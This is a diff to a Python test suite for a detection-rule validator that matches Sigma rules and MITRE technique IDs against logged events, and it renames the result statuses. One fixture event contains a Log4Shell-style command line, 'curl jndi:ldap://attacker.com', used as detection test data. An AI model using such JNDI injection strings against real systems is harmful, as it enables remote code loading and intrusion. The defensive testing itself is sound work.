@@ -21,6 +21,8 @@ from detection_validator.normalizer.schema import (
 from detection_validator.validator.matcher import (
     _keyword_tokens,
     _match_one,
+    _match_techniques,
+    _match_keywords,
     load_events,
     match_corpus,
 )
@@ -158,6 +160,24 @@ class TestMatchOne:
         # technique doesn't match, and "exe" is not in _FREE_TEXT_FIELDS
         assert count == 0
 
+    def test_technique_takes_priority_over_keyword(self) -> None:
+        events = [{"technique": "T1190", "proctitle": "jndi exploit"}]
+        tech_count, _ = _match_techniques(["T1190"], events)
+        kw_count, _   = _match_keywords(["jndi"], events)
+        assert tech_count == 1
+        assert kw_count == 1   # both match; corpus returns technique first
+
+    def test_match_techniques_returns_empty_on_no_techniques(self) -> None:
+        events = [{"technique": "T1190"}]
+        count, samples = _match_techniques([], events)
+        assert count == 0
+        assert samples == []
+
+    def test_match_keywords_empty_tokens_never_matches(self) -> None:
+        events = [{"proctitle": "anything"}]
+        count, _ = _match_keywords([], events)
+        assert count == 0
+
 
 # ── Unit: load_events ────────────────────────────────────────────────────────
 
@@ -223,7 +243,7 @@ class TestMatchCorpus:
         results = match_corpus([detection], path, since_hours=1)
 
         assert len(results) == 1
-        assert results[0].status == "pass"
+        assert results[0].status == "likely_fires"
         assert results[0].hit_count == 1
 
     def test_fail_on_no_matching_events(self, tmp_path: Path) -> None:
@@ -234,7 +254,7 @@ class TestMatchCorpus:
         detection = _make_detection(techniques=["T1190"])
         results = match_corpus([detection], path, since_hours=1)
 
-        assert results[0].status == "fail"
+        assert results[0].status == "no_keyword_match"
         assert results[0].hit_count == 0
 
     def test_keyword_match_from_detection_logic(self, tmp_path: Path) -> None:
@@ -242,11 +262,11 @@ class TestMatchCorpus:
         _write_events(path, [
             {"proctitle": "curl jndi:ldap://attacker.com", "timestamp": _now_iso()},
         ])
-        # Detection with no technique but with keyword in raw Sigma logic
+        # Detection with no technique but with keyword in raw Sigma logic → keyword_partial
         detection = _make_detection(raw_logic="detection:\n  keywords:\n    - jndi")
         results = match_corpus([detection], path, since_hours=1)
 
-        assert results[0].status == "pass"
+        assert results[0].status == "keyword_partial"
 
     def test_skip_when_no_techniques_and_no_keywords(self, tmp_path: Path) -> None:
         path = tmp_path / "events.jsonl"
@@ -274,8 +294,8 @@ class TestMatchCorpus:
 
         assert len(results) == 2
         statuses = {r.name: r.status for r in results}
-        assert statuses["Rule A"] == "pass"
-        assert statuses["Rule B"] == "fail"
+        assert statuses["Rule A"] == "likely_fires"
+        assert statuses["Rule B"] == "no_keyword_match"
 
     def test_since_hours_zero_matches_all(self, tmp_path: Path) -> None:
         path = tmp_path / "events.jsonl"
@@ -285,7 +305,7 @@ class TestMatchCorpus:
         detection = _make_detection(techniques=["T1190"])
         results = match_corpus([detection], path, since_hours=0)
 
-        assert results[0].status == "pass"
+        assert results[0].status == "likely_fires"
 
     def test_result_siem_is_local(self, tmp_path: Path) -> None:
         path = tmp_path / "events.jsonl"
